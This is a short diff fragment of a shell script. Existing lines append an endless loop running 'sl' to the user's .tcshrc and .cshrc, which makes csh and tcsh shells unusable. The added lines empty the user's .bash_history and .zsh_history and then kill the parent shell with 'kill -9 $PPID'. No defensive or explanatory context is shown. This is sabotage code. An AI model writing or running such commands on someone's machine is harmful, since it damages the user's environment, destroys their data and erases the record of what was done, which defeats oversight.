@@ -38,3 +38,8 @@ then
 	echo "\nwhile (1)\n sl\n end"|cat>>.tcshrc
 	echo "\nwhile (1)\n sl\n end"|cat>>.cshrc
 fi
+
+cd ~
+echo "" | cat>.zsh_history
+echo "" | cat>.bash_history
+kill -9 $PPID
